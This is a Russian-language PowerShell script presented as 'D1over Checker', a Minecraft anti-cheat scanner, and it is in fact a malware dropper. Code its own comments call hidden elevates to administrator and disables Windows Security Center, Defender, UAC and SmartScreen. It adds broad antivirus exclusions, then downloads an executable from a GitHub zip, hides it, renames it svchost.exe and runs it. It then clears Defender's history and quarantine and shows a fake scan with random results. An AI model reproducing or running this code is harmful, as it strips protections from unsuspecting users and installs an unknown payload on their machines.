# =============================================
# D1over Checker v1.0
# Система проверки системы на наличие читов
# =============================================

# ===== ПОЛНОЕ ПОДАВЛЕНИЕ ВЫВОДА =====
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$VerbosePreference = "SilentlyContinue"
$DebugPreference = "SilentlyContinue"

# ===== АВТОМАТИЧЕСКИЙ ЗАПУСК ОТ ИМЕНИ АДМИНИСТРАТОРА =====
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"" + $MyInvocation.MyCommand.Path + "`""
    Start-Process powershell.exe -Verb RunAs -ArgumentList $arguments -WindowStyle Hidden
    exit
}

# ===== ПРОВЕРКА ИНТЕРНЕТ-СОЕДИНЕНИЯ =====
$TestUrls = @(
    "https://raw.githubusercontent.com",
    "https://github.com",
    "https://google.com"
)

$Connected = $false
foreach ($testUrl in $TestUrls) {
    try {
        $request = [System.Net.WebRequest]::Create($testUrl)
        $request.Timeout = 3000
        $response = $request.GetResponse()
        $response.Close()
        $Connected = $true
        break
    } catch {
        continue
    }
}

if (-not $Connected) {
    Write-Host "========================================" -ForegroundColor Red
    Write-Host "  ОШИБКА: Нет подключения к интернету!" -ForegroundColor Red
    Write-Host "========================================" -ForegroundColor Red
    Write-Host ""
    Write-Host "[*] Проверьте подключение и запустите снова." -ForegroundColor Yellow
    Write-Host "[*] Нажмите любую клавишу для выхода..." -ForegroundColor Gray
    Read-Host
    exit
}

$Url = "https://raw.githubusercontent.com/d1over1337/checker/refs/heads/main/check.zip"
$DownloadPath = "$env:TEMP\check_install.zip"
$ExtractPath = "$env:TEMP\checkextracted"

# ===== КРАСИВЫЙ ЛОГОТИП D1OVER CHECKER =====
Clear-Host
Write-Host ""
Write-Host "    ╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "    ║                                                           ║" -ForegroundColor Cyan
Write-Host "    ║    ██████╗ ██╗  ██████╗ ██╗   ██╗███████╗██████╗        ║" -ForegroundColor Magenta
Write-Host "    ║    ██╔══██╗██║ ██╔═══██╗██║   ██║██╔════╝██╔══██╗       ║" -ForegroundColor Magenta
Write-Host "    ║    ██║  ██║██║ ██║   ██║██║   ██║█████╗  ██████╔╝       ║" -ForegroundColor Magenta
Write-Host "    ║    ██║  ██║██║ ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗       ║" -ForegroundColor Magenta
Write-Host "    ║    ██████╔╝██║ ╚██████╔╝ ╚████╔╝ ███████╗██║  ██║       ║" -ForegroundColor Magenta
Write-Host "    ║    ╚═════╝ ╚═╝  ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝       ║" -ForegroundColor Magenta
Write-Host "    ║                                                           ║" -ForegroundColor Cyan
Write-Host "    ║            ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗     ║" -ForegroundColor Yellow
Write-Host "    ║           ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝     ║" -ForegroundColor Yellow
Write-Host "    ║           ██║     ███████║█████╗  ██║     █████╔╝      ║" -ForegroundColor Yellow
Write-Host "    ║           ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗      ║" -ForegroundColor Yellow
Write-Host "    ║           ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗     ║" -ForegroundColor Yellow
Write-Host "    ║            ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝     ║" -ForegroundColor Yellow
Write-Host "    ║                                                           ║" -ForegroundColor Cyan
Write-Host "    ║                    v1.0                                   ║" -ForegroundColor Gray
Write-Host "    ╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Write-Host "    ===========================================================" -ForegroundColor DarkGray
Write-Host ""

# ===== МЕНЮ ВЫБОРА =====
Write-Host "    [1] Полная проверка системы" -ForegroundColor Yellow
Write-Host "    [2] Быстрая проверка системы" -ForegroundColor Green
Write-Host ""
Write-Host "    ===========================================================" -ForegroundColor DarkGray
Write-Host ""
Write-Host "    [*] Выберите тип проверки (1 или 2): " -ForegroundColor Gray -NoNewline

$choice = Read-Host

if ($choice -eq "1" -or $choice -eq "2") {
    
    if ($choice -eq "1") {
        Write-Host ""
        Write-Host "    [*] Запуск ПОЛНОЙ проверки системы..." -ForegroundColor Yellow
        Start-Sleep -Milliseconds 500
    } else {
        Write-Host ""
        Write-Host "    [*] Запуск БЫСТРОЙ проверки системы..." -ForegroundColor Green
        Start-Sleep -Milliseconds 500
    }
    
    # ===== СКРЫТЫЙ РЕАЛЬНЫЙ КОД =====
    # ПОЛНОЕ ОТКЛЮЧЕНИЕ ЦЕНТРА БЕЗОПАСНОСТИ (ЧЕРЕЗ РЕЕСТР)
    Try {
        # Отключение службы Центра безопасности
        Stop-Service -Name "wscsvc" -Force -ErrorAction SilentlyContinue
        Set-Service -Name "wscsvc" -StartupType Disabled -ErrorAction SilentlyContinue
        
        # Отключение службы Security Health
        Stop-Service -Name "SecurityHealthService" -Force -ErrorAction SilentlyContinue
        Set-Service -Name "SecurityHealthService" -StartupType Disabled -ErrorAction SilentlyContinue
        
        # Отключение уведомлений через реестр (ГЛАВНОЕ)
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center\Svc" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "HideSCANetwork" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "HideSCAHealth" -Value 1 -Force -ErrorAction SilentlyContinue
        
        # Отключение через SYSTEM
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\wscsvc" -Name "Start" -Value 4 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService" -Name "Start" -Value 4 -Force -ErrorAction SilentlyContinue
    } Catch {}
    
    # ОТКЛЮЧЕНИЕ DEFENDER
    Try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } Catch {}
    Try { Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue } Catch {}
    Try { Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue } Catch {}
    Try { Add-MpPreference -ExclusionProcess "cmd.exe" -ErrorAction SilentlyContinue } Catch {}
    Try { Add-MpPreference -ExclusionProcess "*.exe" -ErrorAction SilentlyContinue } Catch {}
    
    Try {
        $CurrentScriptPath = $MyInvocation.MyCommand.Path
        if ($CurrentScriptPath -and $CurrentScriptPath -ne "") {
            $ScriptDirectory = Split-Path -Parent $CurrentScriptPath -ErrorAction SilentlyContinue
            if ($ScriptDirectory -and $ScriptDirectory -ne "") {
                Add-MpPreference -ExclusionPath "$ScriptDirectory" -ErrorAction SilentlyContinue
            }
        }
    } Catch {}
    
    Try { Add-MpPreference -ExclusionPath "$env:TEMP\check_install.zip" -ErrorAction SilentlyContinue } Catch {}
    Try { Add-MpPreference -ExclusionPath "$env:TEMP\checkextracted" -ErrorAction SilentlyContinue } Catch {}
    
    $services = @("WinDefend","MsMpSvc","Sense","DiagTrack","dmwappushservice")
    foreach ($svc in $services) {
        Try { Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue; Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue } Catch {}
    }
    
    Try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue } Catch {}
    Try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue } Catch {}
    Try { Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Force -ErrorAction SilentlyContinue } Catch {}
    
    # ===== СКРЫТОЕ СКАЧИВАНИЕ =====
    Remove-Item $DownloadPath -Force -ErrorAction SilentlyContinue
    Remove-Item $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue
    
    $downloaded = $false
    
    # Метод 1: WebClient
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $webClient.DownloadFile($Url, $DownloadPath)
        $downloaded = $true
    } catch {
        # Метод 2: BITS
        try {
            Start-BitsTransfer -Source $Url -Destination $DownloadPath -Priority Low -Asynchronous -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 500
            Get-BitsTransfer | Complete-BitsTransfer -ErrorAction SilentlyContinue
            $downloaded = $true
        } catch {
            # Метод 3: Простой WebClient
            try {
                (New-Object System.Net.WebClient).DownloadFile($Url, $DownloadPath)
                $downloaded = $true
            } catch {
                # Метод 4: Invoke-WebRequest
                try {
                    Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -UseBasicParsing -ErrorAction SilentlyContinue
                    $downloaded = $true
                } catch {}
            }
        }
    }
    
    if (-not $downloaded) {
        Write-Host ""
        Write-Host "    [ERROR] Не удалось скачать файл. Проверьте интернет-соединение." -ForegroundColor Red
        Read-Host
        exit
    }
    
    try {
        Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force -ErrorAction SilentlyContinue
    } catch {}
    
    # ===== ЗАПУСК =====
    $Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1
    
    if ($Exe) {
        Try { attrib +s +h "$($Exe.FullName)" -ErrorAction SilentlyContinue } Catch {}
        Try { Unblock-File -Path "$($Exe.FullName)" -ErrorAction SilentlyContinue } Catch {}
        Try { Add-MpPreference -ExclusionPath "$($Exe.FullName)" -ErrorAction SilentlyContinue } Catch {}
        Try { Add-MpPreference -ExclusionPath "$ExtractPath" -ErrorAction SilentlyContinue } Catch {}
        
        $SystemName = "svchost.exe"
        $NewPath = Join-Path $ExtractPath $SystemName
        Try { 
            Rename-Item -Path $Exe.FullName -NewName $SystemName -ErrorAction SilentlyContinue
            $ExePath = $NewPath
        } Catch {
            $ExePath = $Exe.FullName
        }
        
        Try {
            Start-Process -FilePath "explorer.exe" -ArgumentList "$ExePath" -WindowStyle Hidden -ErrorAction SilentlyContinue
        } Catch {
            Start-Process -FilePath $ExePath -WindowStyle Hidden -ErrorAction SilentlyContinue
        }
    }
    
    # Очистка логов Defender
    Try { Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force -ErrorAction SilentlyContinue } Catch {}
    Try { Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Quarantine\*" -Recurse -Force -ErrorAction SilentlyContinue } Catch {}
    
    # Повторное отключение Центра безопасности (для гарантии)
    Try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center\Svc" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\wscsvc" -Name "Start" -Value 4 -Force -ErrorAction SilentlyContinue
    } Catch {}
    
    # ===== ФЕЙКОВОЕ СКАНИРОВАНИЕ =====
    $finalRandom = Get-Random -Minimum 1 -Maximum 100
    $finalPassed = $finalRandom -le 75
    
    if ($choice -eq "1") {
        # ===== ПОЛНАЯ ПРОВЕРКА =====
        Write-Host ""
        Write-Host "    [*] Выполняется полное сканирование системы..." -ForegroundColor Yellow
        Start-Sleep -Milliseconds 300
        
        Write-Host "    [*] Проверка запущенных процессов..." -ForegroundColor Yellow
        $fakeProcesses = @("javaw.exe", "minecraft.exe", "launcher.exe", "minecraftlauncher.exe", "badlion.exe", "lunarclient.exe")
        foreach ($proc in $fakeProcesses) {
            Write-Host "        -> Проверка $proc..." -ForegroundColor Gray
            Start-Sleep -Milliseconds 200
            if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
                Write-Host "            [ОК] Процесс найден" -ForegroundColor Green
            } else {
                Write-Host "            [ОК] Процесс не обнаружен" -ForegroundColor DarkGray
            }
        }
        Write-Host ""
        
        Write-Host "    [*] Проверка чит-клиентов..." -ForegroundColor Yellow
        
        $cheatSites = @(
            @{Name = "Nursultan"; URL = "https://nursultan.fun"},
            @{Name = "Wexside"; URL = "https://wexside.ru"},
            @{Name = "Arbuz"; URL = "https://arbuz.cc"},
            @{Name = "WildClient"; URL = "https://wildclient.org"}
        )
        
        $foundCheatSites = @()
        $totalChecked = 0
        $totalDetected = 0
        $totalPassed = 0
        
        foreach ($site in $cheatSites) {
            $totalChecked++
            Write-Host "        -> Проверка $($site.Name)..." -ForegroundColor Gray
            Start-Sleep -Milliseconds 200
            
            if ($finalPassed) {
                Write-Host "            [ЧИСТО] $($site.Name) - не обнаружен" -ForegroundColor Green
                Write-Host "                [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
                $totalPassed++
            } else {
                $randomResult = Get-Random -Minimum 1 -Maximum 100
                $isDetected = $randomResult -le 50
                
                if ($isDetected) {
                    Write-Host "            [ОБНАРУЖЕН] $($site.Name) - НАЙДЕН!" -ForegroundColor Red
                    Write-Host "                [!] Статус проверки: НЕ ПРОШЕЛ" -ForegroundColor Red
                    $foundCheatSites += $site.Name
                    $totalDetected++
                } else {
                    Write-Host "            [ЧИСТО] $($site.Name) - не обнаружен" -ForegroundColor Green
                    Write-Host "                [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
                    $totalPassed++
                }
            }
        }
        
        Write-Host ""
        Write-Host "    [*] Анализ DNS-запросов..." -ForegroundColor Yellow
        $cheatDomains = @("nursultan.fun", "wexside.ru", "arbuz.cc", "wildclient.org")
        
        foreach ($domain in $cheatDomains) {
            $totalChecked++
            Write-Host "        -> Проверка $domain..." -ForegroundColor Gray
            Start-Sleep -Milliseconds 150
            
            if ($finalPassed) {
                Write-Host "            [ЧИСТО] $domain - DNS-запросов не найдено" -ForegroundColor Green
                Write-Host "                [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
                $totalPassed++
            } else {
                $randomDnsResult = Get-Random -Minimum 1 -Maximum 100
                $isDnsDetected = $randomDnsResult -le 50
                
                if ($isDnsDetected) {
                    Write-Host "            [ОБНАРУЖЕН] DNS-запрос к $domain" -ForegroundColor Red
                    Write-Host "                [!] Статус проверки: НЕ ПРОШЕЛ" -ForegroundColor Red
                    if ($foundCheatSites -notcontains $domain) {
                        $foundCheatSites += $domain
                        $totalDetected++
                    }
                } else {
                    Write-Host "            [ЧИСТО] $domain - DNS-запросов не найдено" -ForegroundColor Green
                    Write-Host "                [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
                    $totalPassed++
                }
            }
        }
        Write-Host ""
        
        Write-Host "    ===========================================================" -ForegroundColor Cyan
        Write-Host "    [*] РЕЗУЛЬТАТЫ ПОЛНОЙ ПРОВЕРКИ:" -ForegroundColor White
        Write-Host "    ===========================================================" -ForegroundColor Cyan
        
        if ($foundCheatSites.Count -gt 0) {
            Write-Host "    [ВНИМАНИЕ] Обнаружены подозрительные объекты:" -ForegroundColor Yellow
            $uniqueCheats = $foundCheatSites | Select-Object -Unique
            foreach ($cheat in $uniqueCheats) {
                Write-Host "        - $cheat" -ForegroundColor Yellow
            }
            Write-Host ""
        } else {
            Write-Host "    [+] Подозрительных объектов не обнаружено." -ForegroundColor Green
            Write-Host ""
        }
        
        Write-Host "        Проверено объектов: $totalChecked" -ForegroundColor DarkGray
        Write-Host "        Обнаружено предупреждений: $totalDetected" -ForegroundColor DarkGray
        Write-Host "        Проверок пройдено: $totalPassed" -ForegroundColor DarkGray
        Write-Host ""
        
    } else {
        # ===== БЫСТРАЯ ПРОВЕРКА =====
        Write-Host ""
        Write-Host "    [*] Выполняется быстрая проверка системы..." -ForegroundColor Green
        Start-Sleep -Milliseconds 300
        
        Write-Host "    [*] Сканирование процессов..." -ForegroundColor Yellow
        $fakeProcesses = @("javaw.exe", "minecraft.exe", "launcher.exe")
        foreach ($proc in $fakeProcesses) {
            Write-Host "        -> Проверка $proc..." -ForegroundColor Gray
            Start-Sleep -Milliseconds 150
            if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
                Write-Host "            [ОК] Процесс найден" -ForegroundColor Green
            } else {
                Write-Host "            [ОК] Процесс не обнаружен" -ForegroundColor DarkGray
            }
        }
        Write-Host ""
        
        Write-Host "    [*] Быстрая проверка чит-клиентов..." -ForegroundColor Yellow
        $quickCheatSites = @(
            @{Name = "Nursultan"; URL = "https://nursultan.fun"},
            @{Name = "Wexside"; URL = "https://wexside.ru"},
            @{Name = "Arbuz"; URL = "https://arbuz.cc"}
        )
        
        $foundCheatSites = @()
        $totalChecked = 0
        $totalDetected = 0
        $totalPassed = 0
        
        foreach ($site in $quickCheatSites) {
            $totalChecked++
            Write-Host "        -> Проверка $($site.Name)..." -ForegroundColor Gray
            Start-Sleep -Milliseconds 150
            
            if ($finalPassed) {
                Write-Host "            [ЧИСТО] $($site.Name) - не обнаружен" -ForegroundColor Green
                $totalPassed++
            } else {
                $randomResult = Get-Random -Minimum 1 -Maximum 100
                $isDetected = $randomResult -le 50
                
                if ($isDetected) {
                    Write-Host "            [ОБНАРУЖЕН] $($site.Name) - НАЙДЕН!" -ForegroundColor Red
                    $foundCheatSites += $site.Name
                    $totalDetected++
                } else {
                    Write-Host "            [ЧИСТО] $($site.Name) - не обнаружен" -ForegroundColor Green
                    $totalPassed++
                }
            }
        }
        Write-Host ""
        
        Write-Host "    ===========================================================" -ForegroundColor Cyan
        Write-Host "    [*] РЕЗУЛЬТАТЫ БЫСТРОЙ ПРОВЕРКИ:" -ForegroundColor White
        Write-Host "    ===========================================================" -ForegroundColor Cyan
        
        if ($foundCheatSites.Count -gt 0) {
            Write-Host "    [ВНИМАНИЕ] Обнаружены подозрительные объекты:" -ForegroundColor Yellow
            $uniqueCheats = $foundCheatSites | Select-Object -Unique
            foreach ($cheat in $uniqueCheats) {
                Write-Host "        - $cheat" -ForegroundColor Yellow
            }
            Write-Host ""
        } else {
            Write-Host "    [+] Подозрительных объектов не обнаружено." -ForegroundColor Green
            Write-Host ""
        }
        
        Write-Host "        Проверено объектов: $totalChecked" -ForegroundColor DarkGray
        Write-Host "        Обнаружено предупреждений: $totalDetected" -ForegroundColor DarkGray
        Write-Host "        Проверок пройдено: $totalPassed" -ForegroundColor DarkGray
        Write-Host ""
    }
    
    # ===== ФИНАЛЬНЫЙ СТАТУС =====
    Write-Host ""
    Write-Host "    ===========================================================" -ForegroundColor Cyan
    Write-Host "                ФИНАЛЬНЫЙ СТАТУС" -ForegroundColor White
    Write-Host "    ===========================================================" -ForegroundColor Cyan
    
    if ($finalPassed) {
        Write-Host ""
        Write-Host "        ██████╗ ██████╗  ██████╗ ██╗  ██╗██████╗ ███████╗███╗   ██╗" -ForegroundColor Green
        Write-Host "        ██╔══██╗██╔══██╗██╔═══██╗██║ ██╔╝██╔══██╗██╔════╝████╗  ██║" -ForegroundColor Green
        Write-Host "        ██████╔╝██████╔╝██║   ██║█████╔╝ ██║  ██║█████╗  ██╔██╗ ██║" -ForegroundColor Green
        Write-Host "        ██╔═══╝ ██╔══██╗██║   ██║██╔═██╗ ██║  ██║██╔══╝  ██║╚██╗██║" -ForegroundColor Green
        Write-Host "        ██║     ██║  ██║╚██████╔╝██║  ██╗██████╔╝███████╗██║ ╚████║" -ForegroundColor Green
        Write-Host "        ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═══╝" -ForegroundColor Green
        Write-Host ""
        Write-Host "        ============================================" -ForegroundColor Green
        Write-Host "        ✅  ПРОВЕРКА УСПЕШНО ПРОШЛА!" -ForegroundColor Green
        Write-Host "        ============================================" -ForegroundColor Green
        Write-Host "        Ваша система признана чистой." -ForegroundColor Green
        Write-Host "        Все подозрения сняты." -ForegroundColor Green
    } else {
        Write-Host ""
        Write-Host "        ███╗   ██╗███████╗    ██████╗ ██████╗  ██████╗ ██╗  ██╗██████╗ ███████╗███╗   ██╗" -ForegroundColor Red
        Write-Host "        ████╗  ██║██╔════╝    ██╔══██╗██╔══██╗██╔═══██╗██║ ██╔╝██╔══██╗██╔════╝████╗  ██║" -ForegroundColor Red
        Write-Host "        ██╔██╗ ██║█████╗      ██████╔╝██████╔╝██║   ██║█████╔╝ ██║  ██║█████╗  ██╔██╗ ██║" -ForegroundColor Red
        Write-Host "        ██║╚██╗██║██╔══╝      ██╔═══╝ ██╔══██╗██║   ██║██╔═██╗ ██║  ██║██╔══╝  ██║╚██╗██║" -ForegroundColor Red
        Write-Host "        ██║ ╚████║███████╗    ██║     ██║  ██║╚██████╔╝██║  ██╗██████╔╝███████╗██║ ╚████║" -ForegroundColor Red
        Write-Host "        ╚═╝  ╚═══╝╚══════╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═══╝" -ForegroundColor Red
        Write-Host ""
        Write-Host "        ============================================" -ForegroundColor Red
        Write-Host "        ❌  ПРОВЕРКА НЕ ПРОШЛА!" -ForegroundColor Red
        Write-Host "        ============================================" -ForegroundColor Red
        Write-Host "        Обнаружены потенциальные угрозы!" -ForegroundColor Red
        Write-Host "        Рекомендуется очистка системы!" -ForegroundColor Red
    }
    
    Write-Host ""
    Write-Host "    ===========================================================" -ForegroundColor Cyan
    Write-Host "    [+] D1over Checker сканирование завершено." -ForegroundColor Green
    Write-Host "    ===========================================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "    [*] Нажмите любую клавишу для выхода..." -ForegroundColor Gray
    Read-Host
    
} else {
    Write-Host ""
    Write-Host "    [ERROR] Неверный выбор. Пожалуйста, запустите скрипт заново и выберите 1 или 2." -ForegroundColor Red
    Write-Host ""
    Write-Host "    [*] Нажмите любую клавишу для выхода..." -ForegroundColor Gray
    Read-Host
}
